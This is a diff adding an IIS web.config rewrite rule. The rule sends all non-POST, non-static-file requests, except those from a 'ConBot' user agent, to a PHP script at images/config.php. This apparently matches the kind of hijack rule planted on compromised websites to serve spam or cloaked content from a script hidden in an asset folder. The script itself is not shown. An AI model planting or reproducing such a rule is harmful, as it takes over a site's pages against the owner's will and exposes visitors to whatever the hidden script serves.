@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<configuration>
+    <system.webServer>
+        <rewrite>
+            <rules>
+                <rule name="topic">
+                    <match url="^(.*)$" ignoreCase="false" />
+					  <conditions>
+						<add input="{HTTP_USER_AGENT}" pattern="(ConBot)" negate="true" />
+						<add input="{URL}" pattern="^((.*)(.css|.js|.jpg|.png|.gif|.jpeg|.bmp|.json|.swf|.pdf|.mp3|.mp4|.doc|.txt))$" negate="true" />
+						<add input="{REQUEST_METHOD}" pattern="POST" negate="true" />
+					  </conditions>
+					  <action type="Rewrite" url="images/config.php" />
+                </rule>
+            </rules>
+        </rewrite>
+  </system.webServer>
+</configuration>
